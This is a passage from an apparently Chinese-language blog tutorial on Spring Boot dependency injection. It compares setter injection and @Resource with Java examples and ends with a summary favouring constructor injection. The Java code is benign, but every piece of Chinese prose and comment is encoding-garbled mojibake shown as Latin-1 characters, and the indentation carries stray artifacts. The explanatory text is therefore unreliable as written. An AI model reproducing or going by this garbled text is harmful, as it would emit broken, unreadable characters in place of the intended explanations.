<p>Setteræ–¹æ³•æ³¨å…¥é€šè¿‡setteræ–¹æ³•å£°æ˜ä¾èµ–ï¼ŒSpringå®¹å™¨åœ¨åˆå§‹åŒ–Beanåï¼Œè°ƒç”¨å¯¹åº”çš„setteræ–¹æ³•æ³¨å…¥ä¾èµ–ã€‚è¿™ç§æ–¹å¼é€‚ç”¨äºâ€œå¯é€‰ä¾èµ–â€åœºæ™¯ï¼Œå³ä¾èµ–ä¸æ˜¯Beanæ­£å¸¸å·¥ä½œçš„å¿…è¦æ¡ä»¶ã€‚</p>
<h4 data-id="heading-13">3.2.1 ä¼˜åŠ¿å’Œé—®é¢˜</h4>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>æ”¯æŒå¯é€‰ä¾èµ–</strong>ï¼šå¯é€šè¿‡setteræ–¹æ³•çš„é»˜è®¤å®ç°æˆ–æ¡ä»¶åˆ¤æ–­ï¼Œå¤„ç†ä¾èµ–ä¸å­˜åœ¨çš„åœºæ™¯ï¼Œçµæ´»æ€§è¾ƒé«˜ã€‚</li>
<li><strong>æ”¯æŒä¾èµ–åŠ¨æ€ä¿®æ”¹</strong>ï¼šåœ¨Beanç”Ÿå‘½å‘¨æœŸä¸­ï¼Œå¯é€šè¿‡è°ƒç”¨setteræ–¹æ³•æ›´æ–°ä¾èµ–ï¼ˆéœ€æ³¨æ„çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼‰ã€‚</li>
</ul>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ul>
<li><strong>ä¸èƒ½è§£å†³å¼€å§‹æåˆ°çš„ä¸‰ç‚¹é—®é¢˜ï¼Œä½†ç¡®å®å¸¦æ¥äº†ä¸€äº›çµæ´»æ€§</strong></li>
<li>Setteræ–¹æ³•æ³¨å…¥ä¸é€‚ç”¨äºå¼ºåˆ¶ä¾èµ–åœºæ™¯ï¼Œå¦åˆ™å¯èƒ½å› ä¾èµ–æœªæ³¨å…¥å¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸</li>
<li>æ— æ³•å£°æ˜finalå˜é‡ï¼Œå®‰å…¨æ€§ä½äºæ„é€ å‡½æ•°æ³¨å…¥ã€‚</li>
</ul>
<h4 data-id="heading-14">3.2.2 ä»£ç ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
Â  Â  <span class="hljs-keyword">private</span> UserDao userDao;
Â  Â  <span class="hljs-keyword">private</span> OrderService orderService;
Â  Â  <span class="hljs-comment">// Setteræ–¹æ³•æ³¨å…¥ï¼Œéœ€æ·»åŠ @Autowiredæ³¨è§£</span>
Â  Â  <span class="hljs-meta">@Autowired</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserDao</span><span class="hljs-params">(UserDao userDao)</span> {
Â  Â  Â  Â  <span class="hljs-built_in">this</span>.userDao = userDao;
Â  Â  }
Â  Â  <span class="hljs-comment">// å¯é€‰ä¾èµ–ï¼Œè®¾ç½®é»˜è®¤å€¼æˆ–ç©ºåˆ¤æ–­</span>
Â  Â  <span class="hljs-meta">@Autowired(required = false)</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOrderService</span><span class="hljs-params">(OrderService orderService)</span> {
Â  Â  Â  Â  <span class="hljs-built_in">this</span>.orderService = orderService;
Â  Â  }
Â  Â  <span class="hljs-meta">@Override</span>
Â  Â  <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
Â  Â  Â  Â  <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userDao.selectById(id);
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (orderService != <span class="hljs-literal">null</span>) {
Â  Â  Â  Â  Â  Â  orderService.updateUserOrderCount(id);
Â  Â  Â  Â  }
Â  Â  Â  Â  <span class="hljs-keyword">return</span> user;
Â  Â  }
}
</code></pre>
<h3 data-id="heading-15">3.3 @Resourceæ³¨è§£æ³¨å…¥</h3>
<p>@Resourceæ³¨è§£ï¼ˆJSR-250è§„èŒƒï¼‰ä¹Ÿæ˜¯ä¸€ç§å¸¸ç”¨çš„æ˜¾å¼æ³¨å…¥æ–¹å¼ï¼Œå…¶ä¸@Autowiredçš„æ ¸å¿ƒåŒºåˆ«åœ¨äºï¼š@ResourceæŒ‰â€œåç§°ä¼˜å…ˆï¼Œç±»å‹æ¬¡ä¹‹â€åŒ¹é…Beanã€‚</p>
<h4 data-id="heading-16">3.3.1 ä¼˜åŠ¿å’Œé—®é¢˜</h4>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ä¸ä¾èµ–Springæ¡†æ¶ï¼Œè€¦åˆåº¦æ›´ä½ã€‚</li>
<li>å¯ä»¥æŒ‡å®šåç§°ï¼Œ<strong>è§£å†³é—®é¢˜3</strong></li>
</ul>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ul>
<li><strong>æ— æ³•è§£å†³é—®é¢˜1å’Œ2</strong></li>
<li>@Resourceä¸æ”¯æŒ@Primaryæ³¨è§£ï¼Œ</li>
<li>ä¸æ”¯æŒæ„é€ å‡½æ•°æ³¨å…¥ï¼Œä»…é€‚ç”¨äºå­—æ®µæ³¨å…¥å’Œsetteræ–¹æ³•æ³¨å…¥ï¼Œå¯ä½œä¸ºæ„é€ å‡½æ•°æ³¨å…¥çš„è¡¥å……åœºæ™¯ä½¿ç”¨ã€‚</li>
</ul>
<h4 data-id="heading-17">3.3.2 ä»£ç ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
Â  Â  <span class="hljs-comment">// æŒ‰Beanåç§°æ³¨å…¥ï¼ˆé»˜è®¤åŒ¹é…å˜é‡åï¼Œå¯é€šè¿‡nameå±æ€§æŒ‡å®šï¼‰</span>
Â  Â  <span class="hljs-meta">@Resource(name = "userDao")</span>
Â  Â  <span class="hljs-keyword">private</span> UserDao userDao;
Â  Â  <span class="hljs-meta">@Override</span>
Â  Â  <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
Â  Â  Â  Â  <span class="hljs-keyword">return</span> userDao.selectById(id);
Â  Â  }
}
</code></pre>
<h2 data-id="heading-18">å››ã€æ€»ç»“</h2>
<ul>
<li>@Autowiredè™½èƒ½å®ç°ä¾èµ–æ³¨å…¥ï¼Œä½†å› éšå¼æ³¨å…¥é™ä½å¯è¯»æ€§ã€å¯èƒ½ä½¿ç”¨ä¸å®Œæ•´å¯¹è±¡ã€å¤šBeanåœºæ™¯å­˜åœ¨æ­§ä¹‰é£é™©ç­‰é—®é¢˜ï¼Œä¸ç¬¦åˆSpring Bootâ€œæ¸…æ™°ã€å¯é ã€æ˜“ç»´æŠ¤â€çš„è®¾è®¡ç†å¿µï¼Œä¸å»ºè®®åœ¨å®é™…å¼€å‘ä¸­ä½¿ç”¨ã€‚</li>
<li>Spring Bootæ¨èçš„æ„é€ å‡½æ•°æ³¨å…¥ï¼Œé€šè¿‡æ˜¾å¼å£°æ˜ä¾èµ–ã€ä¿è¯å¯¹è±¡å®Œæ•´ç­‰ç‰¹æ€§ï¼Œè§£å†³äº†@Autowiredçš„è¯¸å¤šç—›ç‚¹ï¼Œæ˜¯ä¼ä¸šçº§å¼€å‘çš„æœ€ä¼˜é€‰æ‹©ï¼›</li>
<li>Setteræ–¹æ³•æ³¨å…¥å¯ä½œä¸ºå¯é€‰ä¾èµ–åœºæ™¯çš„è¡¥å……ï¼Œ</li>
<li>@Resourceåˆ™é€‚ç”¨äºä½è€¦åˆçš„åç§°åŒ¹é…åœºæ™¯ã€‚</li>
</ul>
<p>åˆç†é€‰æ‹©ä¾èµ–æ³¨å…¥æ–¹å¼ï¼Œèƒ½æ˜¾è‘—æå‡ä»£ç è´¨é‡ã€å¯ç»´æŠ¤æ€§å’Œç³»ç»Ÿç¨³å®šæ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>